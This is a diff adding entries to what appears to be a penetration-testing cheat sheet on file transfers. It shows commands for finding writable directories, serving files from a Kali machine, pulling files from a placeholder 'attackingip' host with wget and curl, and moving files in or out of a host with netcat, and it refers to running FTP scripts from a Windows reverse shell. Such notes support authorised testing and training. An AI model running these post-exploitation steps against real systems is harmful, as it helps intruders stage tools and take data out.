@@ -1,4 +1,27 @@
 ## File Transfers
+#### Find writable directories in Linux
+```
+find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
+```
+#### To host files in Kali
+```
+python -m SimpleHTTPServer 80
+```
+#### To download files
+```
+wget http://attackingip/file.ext
+# or
+curl http://attackingip/file.ext > file.ext
+
+```
+#### Netcat File Transfer
+```
+# Setup a listener to receive file
+nc -nlvp 55555 > file
+
+# Now send the file
+nc iptoreceivefile 55555 < file 
+```
 #### TFTP UDP Transfer
 ```
 # Create directory to serve files
@@ -42,4 +65,3 @@ Now in your Windows bind/reverse shell run the ftp.txt file
 `ftp -v -n -s:ftp.txt`
 
 ---
-
